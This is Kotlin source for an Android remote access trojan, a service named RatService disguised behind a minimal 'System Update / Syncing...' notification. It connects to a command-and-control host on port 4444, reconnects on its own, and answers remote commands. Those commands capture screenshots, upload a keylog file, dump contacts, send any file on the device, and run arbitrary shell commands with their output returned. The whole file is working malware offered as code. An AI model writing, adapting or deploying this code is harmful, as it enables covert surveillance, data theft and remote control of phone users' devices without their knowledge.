package com.myapp2026.update

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract.CommonDataKinds.Phone
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.*
import java.net.InetSocketAddress
import java.net.Socket

class RatService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socket: Socket? = null
    private var out: OutputStream? = null
    private var projection: MediaProjection? = null

    private val C2_HOST = "myapp2026.zapto.org"
    private val C2_PORT = 4444
    private val RECONNECT_MS = 5000L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundCompat()

        if (intent?.action == "SET_MEDIA") {
            val rc = intent.getIntExtra("resultCode", -1)
            @Suppress("DEPRECATION")
            val data = intent.getParcelableExtra<Intent>("data")
            if (rc != -1 && data != null) {
                val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                projection = mpm.getMediaProjection(rc, data)
            }
        }

        if (socket == null) startC2Loop()
        return START_STICKY
    }

    private fun startForegroundCompat() {
        val ch = "sync"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(ch) == null) {
                nm.createNotificationChannel(NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_MIN))
            }
        }
        val n = NotificationCompat.Builder(this, ch)
            .setContentTitle("System Update")
            .setContentText("Syncing...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(1, n)
        }
    }

    private fun startC2Loop() {
        scope.launch {
            while (isActive) {
                try {
                    val s = Socket()
                    s.connect(InetSocketAddress(C2_HOST, C2_PORT), 10000)
                    socket = s
                    out = s.getOutputStream()
                    write("NYX\n")

                    val reader = BufferedReader(InputStreamReader(s.getInputStream()))
                    while (isActive) {
                        val cmd = reader.readLine() ?: break
                        handle(cmd)
                    }
                } catch (_: Exception) {
                } finally {
                    try { socket?.close() } catch (_: Exception) {}
                    socket = null; out = null
                    delay(RECONNECT_MS)
                }
            }
        }
    }

    private fun handle(cmd: String) {
        when {
            cmd == "INFO"         -> info()
            cmd == "SCREENSHOT"   -> screenshot()
            cmd == "KEYLOG"       -> sendFile(File(filesDir, "keys.log").absolutePath)
            cmd == "CONTACTS"     -> contacts()
            cmd.startsWith("DOWNLOAD ") -> sendFile(cmd.substring(9))
            cmd.startsWith("EXEC ")     -> exec(cmd.substring(5))
            cmd == "EXIT"         -> stopSelf()
            else                  -> write("UNKNOWN\n")
        }
    }

    private fun write(s: String) {
        try { out?.write(s.toByteArray()); out?.flush() } catch (_: Exception) {}
    }

    private fun writeBytes(b: ByteArray) {
        try { out?.write(b); out?.flush() } catch (_: Exception) {}
    }

    private fun info() {
        write("MODEL=${Build.MODEL}|MANUFACTURER=${Build.MANUFACTURER}|SDK=${Build.VERSION.SDK_INT}|REL=${Build.VERSION.RELEASE}\n")
    }

    private fun exec(cmd: String) {
        scope.launch {
            try {
                val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                val outR = BufferedReader(InputStreamReader(p.inputStream))
                val errR = BufferedReader(InputStreamReader(p.errorStream))
                val sb = StringBuilder()
                outR.forEachLine { sb.append(it).append('\n') }
                errR.forEachLine { sb.append(it).append('\n') }
                p.waitFor()
                write("EXEC_OUT ${sb.length}\n")
                writeBytes(sb.toString().toByteArray())
            } catch (e: Exception) {
                write("EXEC_ERR ${e.message}\n")
            }
        }
    }

    private fun sendFile(path: String) {
        scope.launch {
            val f = File(path)
            if (!f.exists()) { write("ERR_FILE_NOT_FOUND\n"); return@launch }
            write("OK ${f.length()}\n")
            f.inputStream().use { it.copyTo(OutputStreamWrapper(out!!)) }
            out?.flush()
        }
    }

    private fun screenshot() {
        val mp = projection ?: run { write("ERR_NO_PROJECTION\n"); return }
        scope.launch {
            val bmp = ScreenCapture.capture(mp)
            if (bmp == null) { write("ERR_CAPTURE\n"); return@launch }
            val f = File(cacheDir, "shot.jpg")
            f.outputStream().use { bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, it) }
            bmp.recycle()
            write("SCREENSHOT ${f.length()}\n")
            f.inputStream().use { it.copyTo(OutputStreamWrapper(out!!)) }
            out?.flush()
            f.delete()
        }
    }

    private fun contacts() {
        scope.launch {
            try {
                val sb = StringBuilder()
                contentResolver.query(Phone.CONTENT_URI, null, null, null, null)?.use { c ->
                    val ni = c.getColumnIndex(Phone.DISPLAY_NAME)
                    val pi = c.getColumnIndex(Phone.NUMBER)
                    while (c.moveToNext()) {
                        sb.append(c.getString(ni)).append(':').append(c.getString(pi)).append('\n')
                    }
                }
                write("CONTACTS ${sb.length}\n")
                writeBytes(sb.toString().toByteArray())
            } catch (e: Exception) { write("ERR ${e.message}\n") }
        }
    }

    override fun onDestroy() {
        scope.cancel()
        try { socket?.close() } catch (_: Exception) {}
        super.onDestroy()
    }

    class OutputStreamWrapper(private val o: OutputStream) : OutputStream() {
        override fun write(b: Int) = o.write(b)
        override fun write(b: ByteArray, off: Int, len: Int) = o.write(b, off, len)
        override fun flush() = o.flush()
    }
}
